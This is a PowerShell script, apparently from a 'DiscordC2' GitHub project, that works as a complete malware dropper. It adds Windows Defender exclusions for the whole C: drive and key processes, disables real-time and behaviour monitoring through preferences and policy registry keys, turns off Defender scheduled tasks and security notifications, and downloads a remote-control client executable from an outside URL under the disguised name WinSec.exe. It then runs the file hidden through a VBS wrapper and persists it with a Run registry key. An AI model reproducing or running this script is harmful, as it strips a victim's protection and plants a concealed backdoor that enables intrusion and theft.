# DiscordC2 — Defender Bypass (No Service Killing Needed)
# Author: IMApurbo
# raw.githubusercontent.com/IMApurbo/discordC2/main/disable.ps1

$ErrorActionPreference = 'SilentlyContinue'

# ── step 1: exclusions first (works even with tamper protection) ──
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath $env:APPDATA
Add-MpPreference -ExclusionPath $env:TEMP
Add-MpPreference -ExclusionPath $env:LOCALAPPDATA
Add-MpPreference -ExclusionProcess "powershell.exe"
Add-MpPreference -ExclusionProcess "wscript.exe"
Add-MpPreference -ExclusionProcess "cmd.exe"
Add-MpPreference -ExclusionProcess "WinSec.exe"

# give exclusions time to apply
Start-Sleep -Seconds 2

# ── step 2: disable real time protection ─────────
# these work at admin level even with tamper protection on
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableEmailScanning $true
Set-MpPreference -MAPSReporting 0
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -HighThreatDefaultAction 6
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6

# ── step 3: registry (works without SYSTEM) ───────
# these go through group policy path which overrides defender settings
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v ServiceKeepAlive /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableIOAVProtection /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine" /v MpEnablePus /t REG_DWORD /d 0 /f 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f 2>$null

# ── step 4: disable windows defender scheduled tasks ──
$tasks = @(
    "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
    "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
    "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
    "\Microsoft\Windows\Windows Defender\Windows Defender Verification"
)
foreach ($t in $tasks) {
    schtasks.exe /Change /TN $t /Disable 2>$null
}

# ── step 5: disable windows security notifications ──
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v Enabled /t REG_DWORD /d 0 /f 2>$null

# ── step 6: wait for all settings to apply ────────
Start-Sleep -Seconds 3

# ── step 7: download implant ──────────────────────
# now that C:\ and APPDATA are excluded defender wont touch the exe
$dest   = $env:APPDATA + "\Microsoft\Windows\WinSec.exe"
$url    = "https://github.com/IMApurbo/discordC2/releases/download/C2/c2_client.exe"
$folder = Split-Path $dest

if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

$ok = $false

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent","Mozilla/5.0")
    $wc.DownloadFile($url, $dest)
    $ok = $true
} catch {}

if (!$ok) {
    try {
        Invoke-WebRequest -Uri $url `
            -OutFile $dest `
            -UseBasicParsing `
            -UserAgent "Mozilla/5.0"
        $ok = $true
    } catch {}
}

if (!$ok) {
    try {
        Import-Module BitsTransfer
        Start-BitsTransfer -Source $url -Destination $dest
        $ok = $true
    } catch {}
}

# ── step 8: verify ────────────────────────────────
if (!(Test-Path $dest)) { exit }
if ((Get-Item $dest).Length -lt 100000) {
    Remove-Item $dest -Force
    exit
}

# ── step 9: launch hidden via vbs ─────────────────
$vbs   = $env:APPDATA + "\Microsoft\Windows\wrun.vbs"
$line1 = 'Set o = CreateObject("WScript.Shell")'
$line2 = 'o.Run Chr(34) & "' + $dest + '" & Chr(34), 0, False'
Set-Content -Path $vbs -Value ($line1 + "`r`n" + $line2)
Start-Process "wscript.exe" -ArgumentList ('//B //Nologo "' + $vbs + '"') -WindowStyle Hidden

# ── step 10: persist ──────────────────────────────
# registry run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSec" /t REG_SZ /d ('wscript.exe //B //Nologo "' + $vbs + '"') /f 2>$null
